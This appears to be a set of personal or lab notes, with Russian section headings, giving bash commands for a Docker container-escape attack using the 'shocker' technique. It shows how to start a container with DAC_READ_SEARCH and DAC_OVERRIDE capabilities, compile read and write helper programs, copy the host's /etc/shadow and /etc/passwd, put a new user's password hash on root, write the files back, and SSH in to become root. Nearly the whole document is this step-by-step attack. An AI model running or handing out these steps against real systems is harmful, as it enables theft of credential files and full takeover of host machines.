Набор тулзов в контейнер
```bash
apt install -y vim # or any other editor
apt install -y ssh
apt install -y gcc
apt install john -y # John the Ripper password cracker package
apt install net-tools
apt install -y netcat
```

Запуск уязвимого контейнера 
```bash
sudo docker run -it --cap-add=DAC_READ_SEARCH -cap-add=DAC_OVERRIDE ubuntu bash
```

Перезапись файла
```bash
# Copy and paste the shocker.c content
vim shocker.c
gcc -o read shocker.c
# Copy and paste the shocker_write.c content
vim shocker_write.c
gcc -o write shocker_write.c
# Use the ./read to read files from host: ./read /host/path /container/path
./read /etc/shadow shadow
./read /etc/passwd passwd
# Create new user and reset its password
useradd <USER-NAME>
echo '<USER-NAME>:<PASSWORD>' | chpasswd 
# Update the new user details in the copied files from host
tail -1 /etc/passwd >> passwd
tail -1 /etc/shadow >> shadow
# Copy the new user password hash paste it also for the root user in the shadow file. This will allow us to elevate permissions on the host.
vim shadow
# Use the ./write to write files from host: ./write /host/path /container/path
./write /etc/passwd passwd
./write /etc/shadow shadow
# Connect to host over ssh using the new user (unprivileged)
ssh <USER>@<HOST-IP>
# Elevate privileges to root user with the new password
su
```